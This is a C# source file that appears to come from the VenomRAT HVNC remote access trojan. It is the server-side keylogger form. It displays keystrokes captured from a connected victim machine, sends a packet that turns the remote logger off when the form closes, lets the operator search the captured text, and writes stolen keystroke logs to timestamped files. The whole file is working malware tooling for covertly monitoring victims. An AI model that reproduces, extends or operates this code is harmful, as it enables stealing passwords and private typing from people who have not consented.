using System;
using System.Drawing;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Connection;

namespace VenomRAT_HVNC.Server.Forms
{
    public partial class FormKeylogger : Form
    {
        public FormKeylogger()
        {
            this.InitializeComponent();
        }

        public Form1 F { get; set; }

        internal Clients Client { get; set; }

        public string FullPath { get; set; }

        private void Timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        private void Keylogger_FormClosed(object sender, FormClosedEventArgs e)
        {
            StringBuilder sb = this.Sb;
            if (sb != null)
            {
                sb.Clear();
            }
            if (this.Client != null)
            {
                ThreadPool.QueueUserWorkItem(delegate (object o)
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "Logger";
                    msgPack.ForcePathObject("isON").AsString = "false";
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                });
            }
        }

        private void ToolStripTextBox1_KeyDown(object sender, KeyEventArgs e)
        {
            this.richTextBox1.SelectionStart = 0;
            this.richTextBox1.SelectAll();
            this.richTextBox1.SelectionBackColor = Color.White;
            if (e.KeyData == Keys.Return && !string.IsNullOrWhiteSpace(this.toolStripTextBox1.Text))
            {
                int num;
                for (int i = 0; i < this.richTextBox1.TextLength; i += num + this.toolStripTextBox1.Text.Length)
                {
                    num = this.richTextBox1.Find(this.toolStripTextBox1.Text, i, RichTextBoxFinds.None);
                    if (num == -1)
                    {
                        break;
                    }
                    this.richTextBox1.SelectionStart = num;
                    this.richTextBox1.SelectionLength = this.toolStripTextBox1.Text.Length;
                    this.richTextBox1.SelectionBackColor = Color.Yellow;
                }
            }
        }

        private void ToolStripButton1_Click(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(this.FullPath))
                {
                    Directory.CreateDirectory(this.FullPath);
                }
                File.WriteAllText(this.FullPath + "\\Keylogger_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".txt", this.richTextBox1.Text.Replace("\n", Environment.NewLine));
            }
            catch
            {
            }
        }

        public StringBuilder Sb = new StringBuilder();
    }
}
